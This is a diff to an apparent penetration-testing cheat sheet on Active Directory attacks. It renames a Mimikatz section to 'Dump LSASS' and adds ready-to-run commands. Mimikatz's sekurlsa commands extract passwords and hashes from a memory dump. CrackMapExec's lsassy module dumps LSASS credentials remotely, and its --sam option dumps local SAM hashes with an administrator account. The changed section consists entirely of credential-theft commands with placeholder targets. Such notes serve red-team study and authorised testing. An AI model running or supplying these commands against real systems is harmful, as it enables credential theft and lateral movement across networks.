@@ -57,12 +57,22 @@ Find-DomainShare -CheckShareAccess
 
 All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
 
-### Mimikatz
+### Dump LSASS
 
-Retrieve password/hash from a dump file :
+Mimikatz : Retrieve password/hash from a dump file :
 ```markdown
 sekurlsa::minidump “XXXXXXXXX.DMP”
 sekurlsa::logonPasswords
+```
+
+CrackMapExec : Use the Mimikatz module
+```markdown
+cme smb IP_ADDRESS -u 'Administrator' -p 'PASS' -M lsassy
+```
+
+CrackMapExec : Dump local SAM hashes using local admin account
+```markdown
+crackmapexec smb IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
 ```
 
 ### NTDS Exfiltration
